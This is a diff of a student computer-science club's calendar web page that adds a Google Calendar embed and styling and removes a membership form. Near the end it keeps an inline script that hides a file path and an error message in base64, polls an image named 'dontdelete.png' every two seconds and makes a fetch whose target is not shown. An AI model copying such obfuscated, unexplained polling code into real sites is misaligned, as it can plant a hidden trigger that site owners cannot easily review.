@@ -8,7 +8,39 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../css/styles.css">
+  <linke rel="stylesheet" href="../css/calendar.css">
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+
+  <style>
+    /* Gradient Background */
+    .gradient-section {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        background: linear-gradient(to bottom, rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0));
+        z-index: -1;
+    }
+
+    /* Calendar Container */
+    .calendar-container {
+        position: relative;
+        z-index: 1;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 80px;
+    }
+
+    .calendar-iframe {
+        width: 90%;
+        max-width: 800px;
+        height: 600px;
+        border: none;
+    }
+  </style>
 </head>
 
 <body>
@@ -37,75 +69,53 @@
 
     <!-- Main Content -->
     <main>
+      <!-- gradient -->
+      <section class="gradient-section"></section>
+
+      <!-- calendar -->
       <section class="calendar-section">
         <div class="container">
           <h2 class="section-title">Calendar</h2>
           <p class="section-sub">Stay updated with our upcoming events and meetings.</p>
 
-          <!-- Google Calendar -->
+          <!-- google calendar -->
           <div class="calendar-container">
             <iframe 
               src="https://calendar.google.com/calendar/embed?src=f64u131to44gn3tn8g62ov2u1s%40group.calendar.google.com&amp;ctz=America%2FLos_Angeles"
               title="SCC CS Google Calendar"
-              frameborder="0"
-              scrolling="no"
-              height="600"
-              width="800"
               class="calendar-iframe">
             </iframe>
           </div>
         </div>
       </section>
-
-      <section id="membership" class="membership-section" style="display:none;">
-        <div class="container">
-          <h2 class="section-title">Membership</h2>
-          <div class="membership-form-wrapper">
-            <form id="membership-form" class="membership-form">
-              <div class="form-group">
-                <input type="text" name="name" placeholder="Your Name" required>
-              </div>
-              <div class="form-group">
-                <input type="text" name="student-id" placeholder="Your Student ID #" required>
-              </div>
-              <div class="form-group">
-                <input type="email" name="email" placeholder="Your Email" required>
-              </div>
-              <button type="submit" class="button-primary">
-                <i data-lucide="check"></i> Join
-              </button>
-            </form>
-          </div>
-        </div>
-      </section>
     </main>
 
-    <!-- Footer -->
-    <footer class="footer">
-      <div class="container">
-        <div class="footer-content">
-          <p>&copy; 2025 SCC CS Club</p>
-          <div class="social-links">
-            <a href="https://discord.com/invite/8QXd5Xrw8A" target="_blank" rel="noopener noreferrer" aria-label="Discord">
-              <i class="fa-brands fa-discord"></i>
-            </a>
-            <a href="https://github.com/jenniferpetsko/csclubsolano.com" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
-              <i data-lucide="github"></i>
-            </a>
-            <a href="https://www.instagram.com/computerscience.scc/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
-              <i data-lucide="instagram"></i>
-            </a>
-          </div>
-        </div>
-      </div>
-    </footer>
-  </div>
+   <!-- Footer -->
+		<footer class="footer">
+			<div class="container">
+				<div class="footer-content">
+					<p>&copy; 2025 < SCC CS Club /></p>
+					<div class="social-links">
+						<a href="https://discord.com/invite/8QXd5Xrw8A" target="_blank" rel="noopener noreferrer" aria-label="Discord">
+							<i class="fa-brands fa-discord"></i>
+						</a>
+						<a href="https://github.com/jenniferpetsko/csclubsolano.com" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+							<i data-lucide="github"></i>
+						</a>
+						<a href="https://www.instagram.com/computerscience.scc/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
+							<i data-lucide="instagram"></i>
+						</a>
+					</div>
+				</div>
+			</div>
+		</footer>
+	</div>
 
   <script>
     (function(){
       let d = s => atob(s);
       let imgPath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
-  
+
       setInterval(() => {
           let checkImg = new Image();
           checkImg.src = imgPath + "?bk=" + Date.now();
@@ -118,9 +128,8 @@
                   .catch(e => console.warn(d("QmFja3VwIG1lbGRvd24gZXJyb3I="), e));
           };
       }, 2000);
-  })();
-  
-    </script>
+    })();
+  </script>
 
   <script src="../js/script.js"></script>
 </body>
